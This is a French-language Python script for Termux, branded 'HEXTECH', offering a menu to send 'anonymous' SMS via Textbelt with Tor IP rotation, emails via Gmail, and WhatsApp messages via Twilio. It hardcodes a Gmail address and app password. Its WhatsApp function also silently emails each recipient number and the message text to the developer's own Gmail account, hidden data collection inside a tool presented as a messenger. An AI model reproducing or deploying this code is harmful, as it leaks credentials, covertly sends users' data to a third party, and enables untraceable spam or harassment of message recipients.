import requests
import smtplib
import subprocess
import os
import time
import re
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from stem import Signal
from stem.control import Controller
from twilio.rest import Client

# ==========================
# CONFIGURATION
# ==========================
EMAIL_ADDRESS = "techb1335@gmail.com"
EMAIL_PASSWORD = "oobl xdxj nsgq elhp"  # Mot de passe d'application Gmail
SEND_REPORT_EVERY = 60  # Envoi du rapport toutes les 60 secondes


# ==========================
# INSTALLATION & CONFIGURATION
# ==========================
def installer_tor():
    """Vérifie si Tor est installé et l'installe si nécessaire"""
    try:
        if subprocess.run(["which", "tor"], capture_output=True).returncode != 0:
            print("[🛠] Tor n'est pas installé. Installation en cours...")
            subprocess.run(["pkg", "install", "tor", "-y"], check=True)
            print("[✅] Tor installé avec succès !")
        else:
            print("[✅] Tor est déjà installé.")
    except Exception as e:
        print(f"[❌] Erreur d'installation de Tor : {e}")


def start_tor():
    """Démarre Tor en arrière-plan"""
    try:
        if not os.path.exists("/data/data/com.termux/files/usr/bin/tor"):
            print("[❌] Tor n'est pas installé !")
            return None
        tor_process = subprocess.Popen(['tor'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print("[🔄] Tor démarre...")
        time.sleep(10)
        return tor_process
    except Exception as e:
        print(f"[❌] Erreur lors du démarrage de Tor : {e}")
        return None


def changer_ip():
    """Change l'IP via Tor"""
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate()
            controller.signal(Signal.NEWNYM)
            print("[🌍] Nouvelle IP activée via Tor !")
    except Exception as e:
        print(f"[❌] Erreur lors du changement d'IP : {e}")


# ==========================
# VALIDATION
# ==========================
def valider_numero(numero):
    """Vérifie si le numéro est au format international"""
    return bool(re.match(r"^\+\d{10,15}$", numero))


# ==========================
# FONCTIONS D'ENVOI
# ==========================
def envoyer_sms_anonyme(numero, message):
    """Envoie un SMS anonyme via Textbelt"""
    changer_ip()
    url = "https://textbelt.com/text"
    params = {'phone': numero, 'message': message, 'key': 'textbelt'}
    try:
        response = requests.post(url, data=params)
        if response.status_code == 200:
            print("[✅] SMS envoyé avec succès !")
        else:
            print(f"[❌] Échec de l'envoi du SMS: {response.text}")
    except Exception as e:
        print(f"[❌] Erreur d'envoi SMS : {e}")


def envoyer_email_gmail(to_email, subject, body):
    """Envoie un email via Gmail"""
    changer_ip()
    try:
        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = to_email
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.sendmail(EMAIL_ADDRESS, to_email, msg.as_string())
        server.close()

        print(f"[✅] Email envoyé à {to_email} !")
    except Exception as e:
        print(f"[❌] Erreur d'envoi d'email : {e}")


def envoyer_message_whatsapp(numero, message, sid, auth_token, from_number):
    """Envoie un message WhatsApp via Twilio"""
    client = Client(sid, auth_token)
    try:
        client.messages.create(body=message, from_=f'whatsapp:{from_number}', to=f'whatsapp:{numero}')
        print("[✅] Message WhatsApp envoyé !")
        # Envoi des coordonnées par email après l'envoi du message
        envoyer_email_gmail(EMAIL_ADDRESS, "Coordonnées WhatsApp", f"Numéro: {numero}\nMessage: {message}")
    except Exception as e:
        print(f"[❌] Erreur d'envoi de message WhatsApp : {e}")


# ==========================
# INTERFACE UTILISATEUR
# ==========================

def banner():
    print("\033[1;36m")
    print("╔═══════════════════════════════════════════════════════════════════════╗")
    print("║                                                                            ║")
    print("║  ██╗  ██╗███████╗██╗  ██╗████████╗███████╗ ██████╗██╗  ██╗                ║")
    print("║  ██║  ██║██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔════╝██║  ██║                ║")
    print("║  ███████║█████╗   ╚███╔╝    ██║   █████╗  ██║     ███████║                ║")
    print("║  ██╔══██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██║     ██╔══██║                ║")
    print("║  ██║  ██║███████╗██╔╝ ██╗   ██║   ███████╗╚██████╗██║  ██║                ║")
    print("║  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝                ║")
    print("║                                                                            ║")
    print("╚════════════════════════════════════════════════════════════════════��═╝")
    print("\033[0m")
def afficher_informations():
    print("\033[1;32m")
    print("╔═══════════════════════════════════════╗")
    print("║                                                                            ║")
    print("║  DÉVELOPPEUR : \033[1;36mHEXTECH \033[1;32m                                                ║")
    print("║  CANAL TÉLÉGRAM : \033[1;36mhttps://t.me/hextechcar \033[1;32m                             ║")
    print("║  INSTAGRAM : \033[1;36mSAMSMS01 \033[1;32m                                                ║")
    print("║  GITHUB : \033[1;36mSamsmis01 \033[1;32m                                                   ║")
    print("║                                                                            ║")
    print("╚═══════════════════════════════════════╝")
    print("\033[0m")
    
def menu_principal():
    banner()
    afficher_informations()
    installer_tor()
    tor_process = start_tor()

    while True:
        print("\n[1] SMS Anonyme\n[2] Email\n[3] WhatsApp\n[4] Quitter")
        choix = input("Choisissez une option : ")

        if choix == "1":
            numero = input("Numéro (Format: +XX...): ").strip()
            if valider_numero(numero):
                message = input("Message : ").strip()
                envoyer_sms_anonyme(numero, message)
            else:
                print("[❌] Numéro invalide.")

        elif choix == "2":
            to_email = input("Email du destinataire : ").strip()
            subject = input("Sujet : ").strip()
            body = input("Message : ").strip()
            envoyer_email_gmail(to_email, subject, body)

        elif choix == "3":
            numero = input("Numéro WhatsApp (Format: +XX...): ").strip()
            if valider_numero(numero):
                message = input("Message : ").strip()
                sid = input("Twilio SID : ").strip()
                auth_token = input("Twilio Auth Token : ").strip()
                from_number = input("Votre numéro Twilio (Format: +XX...): ").strip()
                envoyer_message_whatsapp(numero, message, sid, auth_token, from_number)
            else:
                print("[❌] Numéro invalide.")

        elif choix == "4":
            print("[👋] Au revoir !")
            if tor_process:
                tor_process.terminate()
            break

        else:
            print("[❌] Choix invalide.")

# ==========================
# LANCEMENT DU SCRIPT
# ==========================
if __name__ == "__main__":
    menu_principal()
